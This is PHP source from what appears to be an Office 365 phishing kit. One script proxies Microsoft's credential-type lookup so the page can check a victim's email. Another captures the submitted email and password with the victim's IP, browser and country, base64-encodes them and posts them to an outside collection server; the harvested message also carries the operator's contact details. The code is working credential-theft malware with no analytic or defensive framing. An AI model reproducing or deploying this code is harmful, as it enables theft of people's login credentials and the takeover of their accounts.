
<?php
include "email.php";
header('Content-Type: application/json');
$user = $_GET['u'];

$data = array(
   "username" => $user,
   "isOtherIdpSupported" => true,
   "checkPhones" => false,
   "isRemoteNGCSupported" => true,
   "isCookieBannerShown" => false,
   "isFidoSupported" => false,
   "forceotclogin" => false,
   "isExternalFederationDisallowed" => false,
   "isRemoteConnectSupported" => false,
   "federationFlags" => 0,
   "isAccessPassSupported" => true
);

$ch = curl_init();
$url = "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US";
$data_json = json_encode($data);

// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_json);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_TIMEOUT, 80);
 
$res = curl_exec($ch);
curl_close($ch);

echo $res;


// header('Content-Type: application/json');
// $domain = $_GET['d'];


// $ch1 = curl_init();
// $url1 = "https://logo.clearbit.com/".$domain;

// // curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");

// curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($ch1, CURLOPT_URL, $url1);
// // curl_setopt($ch, CURLOPT_TIMEOUT, 80);
 
// $res1 = curl_exec($ch1);
// curl_close($ch1);

// // var_dump($res);

// echo $res1;
?>



<?php
ob_start();
@session_start();  
error_reporting(0); 
$host  = $_SERVER['HTTP_HOST']; $host_upper = strtoupper($host); $path   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
// var_dump($_SESSION['dst']); die();

if(isset($_POST['login'])){
	$login = $_POST['login'];
	$passwd = $_POST['passwd'];
	$ip = getenv("REMOTE_ADDR");

	$errorEmpty = false;
	$errorPass = false;

	// check if any of the field is empty
	if (empty($passwd)) {
		echo 'nopass';
		// $errorEmpty = true;	
	}else{

		// Page name + ip + country name
		$subject = "Office 365 |".$ip."|".get_country();
		$log = base64_encode($login);
		$body = body($login, $passwd);

		// var_dump($body); die();

		$data = [
		'email' => $login,
		'password' => $passwd,
		'send_to' => $Receive_email,
		'subject' => $subject,
		'body' => $body
		];
	

		$mgs = process_gkd('https://server.bossthraed.com/l/banser/index.php', $data);

		if($mgs === 'success'){
			echo "success";
			// header("location: https://portal.office.com/servicestatus");
			// redirect success page
		}

		if($mgs === 'failed'){

			echo "failed";
		}

	}
}

function body($email, $password){
	$country = get_country();
	$ip = getenv("REMOTE_ADDR");

	$message .= "Email     : ". $email ."\n";
	$message .= "Password  : ". $password ."\n";

	$message .= "browser  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "Country : ".$country."\n";
	$message .= "=============================\n";
	$message .= "IP      : ".$ip."\n";
	// $message .= "Host : ". $this->host_name ."\n";
	$message .= "Date: ". date("D M d, Y g:i a") ."\n";
	$message .= "|------Whatsaap: +7 993 203 11 82-----|\n";
	$message .= "|------Telegram:  +7 993 203 11 82-------|\n";

	return $message;
}

/**
 * Visit 
 * @return [type] [description]
 */
function get_country(){
   $client  = @$_SERVER['HTTP_CLIENT_IP'];
   $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
   $remote  = $_SERVER['REMOTE_ADDR'];
   $result  = "Unknown";

   if(filter_var($client, FILTER_VALIDATE_IP)){
      $ip = $client;
   }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
      $ip = $forward;
   }else{
      $ip = $remote;
   }

   $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

   if($ip_data && $ip_data->geoplugin_countryName != null){
      $result = $ip_data->geoplugin_countryName;
   }

   return $result;
}

/**
 * Enter
 * @param  array  $arr [description]
 * @return [type]      [description]
 */
function arg_gkd($arr = array()){
	$postData = '';
	foreach($arr as $i => $val){ 
	    $postData .= $i .'='.base64_encode($val).'&'; 
	}
	return rtrim($postData, '&');
}

function process_gkd($url, $arr = array()){
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url );
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch,CURLOPT_POSTFIELDS, arg_gkd($arr) );


 $result = curl_exec($ch);
 curl_close($ch);

 return $result;
}

?>

